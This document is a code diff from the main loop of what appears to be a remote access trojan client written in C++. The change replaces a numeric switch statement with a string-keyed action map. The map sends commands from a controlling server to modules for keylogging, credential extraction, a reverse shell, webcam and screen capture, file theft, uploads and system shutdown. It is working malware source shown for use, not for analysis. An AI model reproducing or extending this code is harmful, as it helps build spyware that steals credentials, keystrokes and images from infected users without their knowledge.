@@ -22,6 +22,7 @@
 #include "ScreenStreamer.h"
 #include "json.hpp"
 #include "CredentialsExtractor.h"
+#include "ConnectionState.h"
 
 
 std::map<std::string, std::shared_ptr<Stream>> connections;
@@ -105,8 +106,9 @@ int main(int argc = 0, char *argv[] = nullptr) {
         keyLogger.tryStart();
 //#endif
         //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
-        bool connectionState = true;
-        while (connectionState) {
+        bool isConnecting = true;
+        bool streamListening = true;
+        while (isConnecting) {
             nlohmann::json jsonObject;
             std::cout << "trying to connect " << std::endl;
             generate_sockets();
@@ -134,125 +136,35 @@ int main(int argc = 0, char *argv[] = nullptr) {
             KeyboardExecuter keyboardExecuter(stream);
             SystemInformation sysInfo(stream);
             NetworkInformation networkInfo(stream);
-            bool streamListening = true;
+            ConnectionState connectionState(stream, isConnecting,streamListening);
+
+
+            std::unordered_map<std::string, std::function<void(nlohmann::json &)>> actionMap;
+            actionMap["CONN_STATE"] = [&](nlohmann::json &json) { connectionState.managerMenu(json); };
+            actionMap["FILE_MANAGER"] = [&](nlohmann::json &json) { fileManager.managerMenu(json); };
+            actionMap["SYSTEM_INFORMATION"] = [&](nlohmann::json &json) { sysInfo.send(); };
+            actionMap["NETWORK_INFORMATION"] = [&](nlohmann::json &json) { networkInfo.send(); };
+            actionMap["KEYLOGGER"] = [&](nlohmann::json &json) { keyLogger.managerMenu(json); };
+            actionMap["UP_DO_LOADER"] = [&](nlohmann::json &json) { download.managerMenu(json); };
+            actionMap["REVERSE_SHELL"] = [&](nlohmann::json &json) { reverseShell.managerMenu(json); };
+            actionMap["CREDENTIALS"] = [&](nlohmann::json &json) { credentialsExtractor.managerMenu(json); };
+            actionMap["WEBCAM"] = [&](nlohmann::json &json) { webcamManager.managerMenu(json); };
+            actionMap["SCREEN"] = [&](nlohmann::json &json) { screenStreamer.managerMenu(json); };
+            actionMap["DEV_ENUM"] = [&](nlohmann::json &json) { deviceEnumerator.managerMenu(json); };
+            actionMap["KEYBOARD"] = [&](nlohmann::json &json) { keyboardExecuter.managerMenu(json); };
+            actionMap["PERMISSION"] = [&](nlohmann::json &json) { permission.managerMenu(json); };
+            actionMap["BOX_MESSAGE"] = [&](nlohmann::json &json) { messageBoxGUI.managerMenu(json); };
+            actionMap["SYSTEM_STATE"] = [&](nlohmann::json &json) { SystemState::setState(json); };
+
             while (streamListening) {
                 jsonObject = nlohmann::json::parse(stream.readString());
-                int action = jsonObject["action"];
-                std::cout << "action -> " << action << std::endl;
-                switch (action) {
-                    case -3: { // Uninstall client
-                        Install::uninstall();
-                    }
-                    case -2: { // Fully disconnect and close program
-                        connectionState = false;
-                        streamListening = false;
-                        break;
-                    }
-                    case -1: { // Try to connect again to server
-                        streamListening = false;
-                        break;
-                    }
-                    case 0: { // System information retrieving
-                        sysInfo.send();
-                        break;
-                    }
-                    case 1: {  // Network information retrieving
-                        networkInfo.send();
-                        break;
-                    }
-                    case 2: {  // Reading disks of system
-                        threadGen.runInNewThread(&fileManager, &FileManager::sendDisks);
-                        break;
-                    }
-                    case 3: { // Read all directory (files and folders)
-                        threadGen.runInNewThread(&fileManager, &FileManager::sendDirectory, jsonObject);
-                        break;
-                    }
-                    case 5: { // download file or directory
-                        threadGen.runInNewThread(&download, &Download::downloadContent, jsonObject);
-                        break;
-                    }
-                    case 6: { // copy file or directory
-                        threadGen.runInNewThread(&fileManager, &FileManager::copyFilesThread, jsonObject);
-                        break;
-                    }
-                    case 7: { // move file or directory
-                        threadGen.runInNewThread(&fileManager, &FileManager::moveFilesThread, jsonObject);
-                        break;
-                    }
-                    case 8: { // delete file or directory
-                        threadGen.runInNewThread(&fileManager, &FileManager::deleteFilesThread, jsonObject);
-                        break;
-                    }
-                    case 9: { // run file or directory
-                        threadGen.runInNewThread(&fileManager, &FileManager::runFilesThread, jsonObject);
-                        break;
-                    }
-                    case 10: { // upload files to directory
-                        threadGen.runInNewThread(&download, &Download::uploadFiles, jsonObject);
-                        break;
-                    }
-                    case 11: { // executes command on shell
-                        threadGen.runInNewThread(&reverseShell, &ReverseShell::executeCommandAndSendResult, jsonObject);
-                        break;
-                    }
-//#ifdef KEYLOGGER_DEF
-                    case 4: { // sends last log file in current session of client
-                        threadGen.runInNewThread(&keyLogger, &KeyLogger::send);
-                        break;
-                    }
-                    case 14: { // sends all logs located on appdata folder
-                        threadGen.runInNewThread(&keyLogger, &KeyLogger::sendAll);
-                        break;
-                    }
-                    case 15:{
-                        threadGen.runInNewThread(&credentialsExtractor, &CredentialsExtractor::sendKeyAndDatabase);
-                        break;
-                    }
-//#endif
-#ifdef WEBCAM
-                    case 16: { // send webcam devices
-                        threadGen.runInNewThread(&deviceEnumerator, &DeviceEnumerator::sendWebcamDevices);
-                        break;
-                    }
-
-                    case 17: { // downloadContent webcam with custom features
-                        threadGen.runInNewThread(&webcamManager, &WebcamManager::startWebcam, jsonObject);
-                        break;
-                    }
-#endif
-                    case 18: { // keyboard executer, executeCommand custom order of keyboard strokes and delays
-                        threadGen.runInNewThread(&keyboardExecuter, &KeyboardExecuter::executeCommand, jsonObject);
-                        break;
-                    }
-                    case 20: { // send result of UAC dialog
-                        threadGen.runInNewThread(&permission, &Permission::sendElevatedPermissions);
-                        break;
-                    }
-                    case 21: { // open messagebox with custom features
-                        threadGen.runInNewThread(&messageBoxGUI, &MessageBoxGUI::generateMessageBox, jsonObject);
-                        break;
-                    }
-#ifdef WEBCAM
-                    case 22: { // downloadContent screen streaming TODO fix screen controlling
-                        threadGen.runInNewThread(&screenStreamer, &ScreenStreamer::startStreaming, jsonObject);
-                        break;
-                    }
-#endif
-                    case 23: { // log off
-                        SystemState::setState(0);
-                        break;
-                    }
-                    case 24: { // shutdown
-                        SystemState::setState(1);
-                        break;
-                    }
-                    case 26: { // restart
-                        SystemState::setState(2);
-                        break;
-                    }
-                    default:
-                        break;
+                std::string action = jsonObject["SECTOR"];
+                std::cout << "Sector: " << action << std::endl;
+                auto it = actionMap.find(action);
+                if (it != actionMap.end()) {
+                    it->second(jsonObject);
+                } else {
+                    std::cout << "SECTOR NOT FOUND :(" << std::endl;
                 }
             }
             // TODO FIX CLOSING
